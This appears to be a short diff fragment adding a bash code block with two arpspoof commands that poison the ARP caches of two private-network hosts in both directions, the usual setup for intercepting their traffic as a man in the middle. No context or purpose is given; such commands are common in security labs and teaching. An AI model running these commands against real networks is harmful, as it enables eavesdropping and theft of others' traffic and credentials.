@@ -1,0 +1,4 @@
+```bash
+sudo arpspoof -i eth0 -t 192.168.3.34 192.168.3.35
+sudo arpspoof -i eth0 -t 192.168.3.35 192.168.3.34
+```
